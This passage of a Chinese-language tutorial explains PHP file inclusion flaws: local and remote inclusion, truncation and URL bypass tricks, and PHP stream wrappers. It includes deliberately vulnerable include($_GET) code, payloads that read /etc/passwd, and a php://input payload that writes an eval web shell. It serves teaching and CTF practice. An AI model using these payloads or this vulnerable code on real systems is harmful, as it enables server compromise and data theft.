class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'./action/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'./action/show.php'</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span> <span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'./action/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'./action/show.php'</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h1 id=\"本地文件包含\"><a class=\"anchor\" href=\"#本地文件包含\">#</a> 本地文件包含</h1>\n<h2 id=\"无限制本地文件包含\"><a class=\"anchor\" href=\"#无限制本地文件包含\">#</a> 无限制本地文件包含</h2>\n<p>这种直接找我们到需要的文件路径，进行包含就行。</p>\n<p><span class=\"label\">示例</span></p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h2 id=\"有限制本地文件包含\"><a class=\"anchor\" href=\"#有限制本地文件包含\">#</a> 有限制本地文件包含</h2>\n<p>这种类型需要我们找到的敏感文件路径，然后<ins class=\"info\">绕过限制</ins>进行包含就行。</p>\n<h3 id=\"00截断\"><a class=\"anchor\" href=\"#00截断\">#</a> %00 截断</h3>\n<p>条件：magic_quotes_gpc = Off php 版本 &lt; 5.3.4</p>\n<p>在上面常见环境代码的后两种都得用 %00 截断</p>\n<p><span class=\"label warning\">示例</span><br />\n <code>http://www.xxx.com/xx.php?filename=../../etc/passwd%00</code></p>\n<h3 id=\"路径长度截断\"><a class=\"anchor\" href=\"#路径长度截断\">#</a> 路径长度截断</h3>\n<p>条件：windows OS，点号需要长于 256；linux OS 长于 4096</p>\n<p>Windows 下目录最大长度为 256 字节，超出的部分会被丢弃；</p>\n<p>Linux 下目录最大长度为 4096 字节，超出的部分会被丢弃。</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$filename</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><div class=\"tab\" data-id=\"id1\" data-title=\"EXP:\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jdGZzLXdpa2kuY29tL0ZJL0ZJLnBocD9maWxlbmFtZT10ZXN0LnR4dC8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8=\">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span></p>\n</div>\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<h3 id=\"点号截断\"><a class=\"anchor\" href=\"#点号截断\">#</a> 点号截断</h3>\n<p>条件：windows OS，点号需要长于 256</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$filename</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><div class=\"tab\" data-id=\"id2\" data-title=\"EXP:\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jdGZzLXdpa2kuY29tL0ZJL0ZJLnBocD9maWxlbmFtZT10ZXN0LnR4dA==\">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt</span>.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</p>\n</div>\n<h1 id=\"远程文件包含\"><a class=\"anchor\" href=\"#远程文件包含\">#</a> 远程文件包含</h1>\n<p>PHP 的配置文件 allow_url_fopen 和 allow_url_include 设置为 ON，include/require 等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>\n<div class=\"note info\">\n<p>allow_url_fopen = On（是否允许打开远程文件）<br />\nallow_url_include = On（是否允许 include/require 远程文件）</p>\n</div>\n<h2 id=\"无限制远程文件包含\"><a class=\"anchor\" href=\"#无限制远程文件包含\">#</a> 无限制远程文件包含</h2>\n<p>和无限制本地文件包含差不多。不再介绍（懒蛋。。）<br />\n<img data-src=\"image009.png\" alt=\"\" /></p>\n<h2 id=\"有限制远程文件包含\"><a class=\"anchor\" href=\"#有限制远程文件包含\">#</a> 有限制远程文件包含</h2>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>代码中多添加了 html 后缀，导致远程包含的文件也会多一个 html 后缀。</p>\n<h3 id=\"绕过姿势\"><a class=\"anchor\" href=\"#绕过姿势\">#</a> 绕过姿势</h3>\n<ol>\n<li>\n<p>问号绕过<br />\n <code>http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt?</code> <br />\n<img data-src=\"image012.png\" alt=\"\" /></p>\n</li>\n<li>\n<p>#号绕过<br />\n <code>http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt%23</code> <br />\n<img data-src=\"image011.png\" alt=\"\" /></p>\n</li>\n<li>\n<p>空格 (%20) 绕过<br />\n <code>http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt%20</code> <br />\n<img data-src=\"image010.png\" alt=\"\" /></p>\n</li>\n</ol>\n<h1 id=\"php伪协议\"><a class=\"anchor\" href=\"#php伪协议\">#</a> PHP 伪协议</h1>\n<p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen ()、 copy ()、 file_exists () 和 filesize () 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register () 来注册自定义的封装协议。</p>\n<p>支持的种类有这 12 种</p>\n<ul>\n<li>file:// — 访问本地文件系统</li>\n<li>http:// — 访问 HTTP (s) 网址</li>\n<li>ftp:// — 访问 FTP (s) URLs</li>\n<li>php:// — 访问各个输入 / 输出流（I/O streams）</li>\n<li>zlib:// — 压缩流</li>\n<li>data:// — 数据（RFC 2397）</li>\n<li>glob:// — 查找匹配的文件路径模式</li>\n<li>phar:// — PHP 归档</li>\n<li>ssh2:// — Secure Shell 2</li>\n<li>rar:// — RAR</li>\n<li>ogg:// — 音频流</li>\n<li>expect:// — 处理交互式的流</li>\n</ul>\n<h2 id=\"php-输入输出流\"><a class=\"anchor\" href=\"#php-输入输出流\">#</a> php:// 输入输出流</h2>\n<p>PHP 提供了一些杂项输入 / 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>\n<h2 id=\"phpstdin-phpstdout-和-phpstderr\"><a class=\"anchor\" href=\"#phpstdin-phpstdout-和-phpstderr\">#</a> php://stdin, php://stdout 和 php://stderr</h2>\n<p>php://stdin、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。 数据流引用了复制的文件描述符，所以如果你打开 php://stdin 并在之后关了它， 仅是关闭了复制品，真正被引用的 STDIN 并不受影响。 推荐简单使用常量 STDIN、 STDOUT 和 STDERR 来代替手工打开这些封装器。</p>\n<p><span class=\"label warning\">php://stdin 是只读的，php://stdout 和 php://stderr 是只写的。</span></p>\n<p><span class=\"label success\">📣举例</span></p>\n<ol>\n<li><span class=\"label info\">php://stdin</span></li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$line</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://stdin'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//open our file pointer to read from stdin</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$line</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$line</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 读取</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image018.png\" alt=\"\" /></p>\n<p>可以看到打开了一个文件指针进行读取</p>\n<ol start=\"2\">\n<li><span class=\"label info\">php://stdout</span></li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$fd</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://stdout'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$fd</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"这是一个测试\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image019.png\" alt=\"\" /><br />\n可以看到打开了一个文件指针进行写入</p>\n<ol start=\"3\">\n<li><span class=\"label info\">php://stderr</span></li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$stderr</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'php://stderr'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'w'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$stderr</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"lalala\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$stderr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image020.png\" alt=\"\" /></p>\n<p>可以看到打开了一个文件指针进行写入</p>\n<h2 id=\"phpinput\"><a class=\"anchor\" href=\"#phpinput\">#</a> php://input</h2>\n<p>php://input 是个可以访问请求的原始数据的只读流。因为它不依赖于特定的 php.ini 指令。<br />\n<span class=\"label warning\">注：enctype=”multipart/form-data” 的时候 php://input 是无效的。</span></p>\n<h3 id=\"phpinput-读取post数据\"><a class=\"anchor\" href=\"#phpinput-读取post数据\">#</a> php://input （读取 POST 数据）</h3>\n<p>碰到 file_get_contents () 就要想到用 php://input 绕过，因为 php 伪协议也是可以利用 http 协议的，即可以使用 POST 方式传数据，具体函数意义下一项；</p>\n<p>测试代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre># 1.php文件</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php://input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>访问 <code>http://192.168.199.130/1.php</code> burp 抓包，添加 post 数据。</p>\n<p><span class=\"label\">结果</span></p>\n<p><img data-src=\"image021.png\" alt=\"\" /></p>\n<h3 id=\"phpinput写马\"><a class=\"anchor\" href=\"#phpinput写马\">#</a> php://input 写马</h3>\n<p>测试代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>条件：<ins>php 配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）</ins>, 就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即 POST 过去 PHP 代码，即可执行。</p>\n<p>如果 POST 的数据是执行写入一句话木马的 PHP 代码，就会在当前目录下写入一个木马。</p>\n<p><code>&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;</code> <br />\n<span class=\"lebal info\"> 图片</span></p>\n<p><img data-src=\"image022.png\" alt=\"\" /></p>\n<p><span class=\"label info\">当 allow_url_include=Off 时是不行的</span></p>\n<p><img data-src=\"image023.png\" alt=\"\" /></p>\n<h3 id=\"phpinput命令执行\"><a class=\"anchor\" href=\"#phpinput命令执行\">#</a> php://input 命令执行</h3>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>条件：<ins>php 配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）</ins>, 就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即 POST 过去 PHP 代码，即可执行；<br />\n<span class=\"lebal info\">图片</span></p>\n<p><img data-src=\"image024.png\" alt=\"\" /></p>\n<h2 id=\"phpfilter本地磁盘文件进行读取\"><a class=\"anchor\" href=\"#phpfilter本地磁盘文件进行读取\">#</a> php://filter（本地磁盘文件进行读取）</h2>\n<p>元封装器，设计用于 &quot;数据流打开&quot; 时的 &quot;筛选过滤&quot; 应用，对本地磁盘文件进行读写。</p>\n<p>用法：<br />\n <code>?filename=php://filter/convert.base64-encode/resource=xxx.php</code> <br />\n <code>?filename=php://filter/read=convert.base64-encode/resource=xxx.php</code>  一样。</p>\n<p>条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；</p>\n<p>php://filter 参数</p>\n<table>\n    <tr>\n        <th>名称</th>\n        <th>描述</th>\n        <th>备注</th>\n    </tr>\n    <tr>\n        <td>resource=&lt;要过滤的数据流&gt;</td>\n        <td>指定了你要筛选过滤的数据流。</td>\n        <td>必选</td>\n    </tr>\n    <tr>\n        <td>read=&lt;读链的筛选列表&gt;</td>\n        <td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>\n        <td>可选</td>\n    </tr>\n    <tr>\n        <td>write=&lt;写链的筛选列表&gt;</td>\n        <td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>\n        <td>可选</td>\n    </tr>\n    <tr>\n        <td>&lt;；两个链的筛选列表&gt;</td>\n        <td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>\n        <td>&nbsp;</td>\n    </tr>\n</table>\n<p>过滤器详解<span class=\"exturl\" 